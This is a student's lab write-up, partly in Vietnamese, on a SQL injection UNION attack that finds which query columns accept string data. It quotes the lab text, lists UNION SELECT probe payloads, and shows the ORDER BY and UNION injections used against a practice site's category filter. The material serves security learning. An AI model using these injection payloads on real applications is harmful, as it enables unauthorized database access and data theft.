1.Note:
    A SQL injection UNION attack enables you to retrieve the results from an injected query. 
    The interesting data that you want to retrieve is normally in string form. 
    This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

    After you determine the number of required columns, you can probe each column to test whether it can hold string data.
    You can submit a series of UNION SELECT payloads that place a string value into each column in turn. 
    For example, if the query returns four columns, you would submit:

        ' UNION SELECT 'a',NULL,NULL,NULL--
        ' UNION SELECT NULL,'a',NULL,NULL--
        ' UNION SELECT NULL,NULL,'a',NULL--
        ' UNION SELECT NULL,NULL,NULL,'a'--
    If the column data type is not compatible with string data, the injected query will cause a database error, such as:

        Conversion failed when converting the varchar value 'a' to data type int.

2.Lab
    This lab contains a SQL injection vulnerability in the product category filter. 
    The results from the query are returned in the application's response, 
    so you can use a UNION attack to retrieve data from other tables. 
    To construct such an attack, you first need to determine the number of columns returned by the query. 
    You can do this using a technique you learned in a previous lab. 
    The next step is to identify a column that is compatible with string data.

    The lab will provide a random value that you need to make appear within the query results. 
    To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. 
    This technique helps you determine which columns are compatible with string data.

    Make the database retrieve the string: 'ZXmnnx'
    
    'ZXmnnx' Đây là giá trị dữ liệu cho trước để thực hiện truy vấn

    Bước 1: Ta tìm số cột được truy vấn:
        /filter?category=Gifts'+order+by+3--
        =>> Vẫn ra kết quả
        /filter?category=Gifts'+order+by+4--
        =>>Internal Server Error
        =>>Lỗi không có bảng nên suy ra số bảng được truy vấn là 3.
     Bước 2: 
        Thử lần 1:
            /filter?category=Gifts'+union+select+'ZXmnnx',null,null--
            =>> Internal Server Error
        Thử lần 2:
            /filter?category=Gifts'+union+select+null,'ZXmnnx',null--
            =>> Solved
